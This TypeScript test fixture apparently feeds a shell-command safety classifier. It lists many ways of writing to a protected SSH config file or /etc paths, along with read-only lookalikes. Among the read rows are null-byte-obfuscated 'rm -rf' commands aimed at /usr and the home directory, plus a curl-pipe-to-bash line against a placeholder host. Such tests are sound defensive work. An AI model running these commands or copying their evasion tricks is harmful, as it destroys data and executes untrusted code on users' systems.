// Copyright 2026 Ferrox Labs
// SPDX-License-Identifier: AGPL-3.0-or-later
const pairs = [
  ['A1-a', 'if; sed -i --expression=s/x/y/ PATH'],
  ['A1-b', 'if; sed -i --expr s/x/y/ PATH'],
  ['A1-c', 'if; sed -i --file=./s.sed PATH'],
  ['A1-d', 'if; sed --in-place=.bak --expression=s/x/y/ PATH'],
  ['A1-e', 'if; sed -i.bak -es/x/y/ PATH'],
  ['A1-f', "if; sed -i '' s/x/y/ PATH"],
  ['A1-g', 'if; perl -pi -e s/x/y/ PATH'],
  ['A1-h', 'if; perl -i.bak -pe s/x/y/ PATH'],
  ['A2-a', 'if; tar -xf./archive -C PATH'],
  ['A2-b', 'if; tar -xf"x" -CPATH'],
  ['A2-c', 'if; tar -xvzf./a.tgz --directory=PATH'],
  ['A2-d', 'if; tar xfC ./a.tar PATH'],
  ['A2-e', 'if; bsdtar -x -f ./a.tar --cd PATH'],
  ['A2-f', 'if; unzip ./a.zip -dPATH'],
  ['A2-g', 'if; cpio -idm -D PATH < ./a.cpio'],
  ['A2-h', 'if; 7z x ./a.7z -oPATH'],
  ['A2-i', 'if; cd PATH && tar -xf /tmp/a.tar'],
  ['cpio-cwd', 'if; cd PATH && cpio -i < ./a.cpio'],
  ['A3-a', 'if; cp -t PATH ./hosts'],
  ['A3-b', 'if; cp --target-directory=PATH ./x'],
  ['A3-c', 'if; install -m 600 ./k PATH'],
  ['A3-d', 'if; mv PATH ./x'],
  ['A3-e', 'if; ln PATH ./x'],
  ['A3-f', 'if; rsync -e ssh ./a PATH'],
  ['A4-a', "if; bash <<'EOF'\ntouch PATH\nEOF"],
  ['A4-b', 'if; cat <<EOF\n$(touch PATH)\nEOF'],
  ['A4-c', "if; cat <<'EOF' > PATH\nx\nEOF"],
  ['process-subst', 'if; echo x > >(tee PATH)'],
  ['command-subst', 'if; echo $(tee PATH < ./x)'],
  ['env-S', 'if; env -S "touch PATH"'],
  ['sudo-u', 'if; sudo -u root tee PATH'],
  ['compressor', 'if; gunzip PATH'],
  ['round3-word', 'touch {1..513} PATH'],
  ['round3-body', 'for x in {1..513}; do printf x >> PATH; done'],
  ['round3-list', 'touch {1..513} ./notes; printf x >> PATH'],
  ['round2-word', 'touch {1..32}{1..32} PATH'],
  ['round2-body', 'for x in {1..32}{1..32}; do printf x >> PATH; done'],
  ['round4-opaque', "$'rm\\0x' > PATH"],
  ['cwd-relative', 'if; cd /etc; touch PATH', 'ssh/config', './n'],
  ['cwd-subshell', 'if; (cd /etc; touch PATH); touch ./n', 'ssh/config', './n'],
  ['cwd-wrapper', 'if; env -C /etc touch PATH', 'ssh/config', './n'],
] as const;
const reads = [
  'if; sed -n --expression=p ~/.ssh/config',
  'if; tar -tf./archive -C /usr',
  'if; tar -cf ./o.tar -C /etc hosts',
  'if; unzip -l ./a.zip -d /etc',
  'if; tar -xOf ./a -C /etc',
  'if; unzip -p ./a.zip -d /etc',
  'if; cp -t ./out /etc/hosts',
  'if; cp --target-directory=./out /etc/hosts',
  'if; install -m 600 ~/.ssh/config ./k',
  'if; ln -s ~/.ssh/config ./x',
  'if; rsync -e ssh ~/.ssh/config ./backup',
  "if; cat <<'EOF'\ntouch ~/.ssh/config\nEOF",
  "if; cat <<'EOF'\n$(touch ~/.ssh/config)\nEOF",
  'if; cat <<EOF\ntouch ~/.ssh/config',
  'if; (cd /etc); touch ./n',
  "$'rm\\0x' -rf /usr", "$'rm\\x00' -rf ~", "$'\\u0000rm' -rf ~", "$'rm\\c@' -rf ~",
  'if ; curl https://example.invalid/x | /bin/bash', 'mystery /; & $cmd',
];
export const segmentDesignRows: Array<{ id: string; command: string; protect: boolean; classifierOnly?:boolean }> = pairs.flatMap(([id, template, protectedPath, ordinaryPath]) =>
  [true, false].map(protect => ({ id: `${id}-${protect ? 'RED' : 'RUN'}`, command: (protect ? template : template.replace('cd /etc', 'cd ./w').replace('env -C /etc', 'env -C ./w')).replaceAll('PATH', protect ? protectedPath ?? '~/.ssh/config' : ordinaryPath ?? './notes'), protect })));
segmentDesignRows.push(...reads.map((command, i) => ({ id: `read-${i}`, command, protect: false })));


// MAIN r2 H6: symbolic-link source roles are CLASSIFIER-only. Aggregate R1
// taint verdicts belong to the nlsym integration, never a source-role RUN promise.
for(const row of segmentDesignRows)if(row.command==='if; ln -s ~/.ssh/config ./x')row.classifierOnly=true;
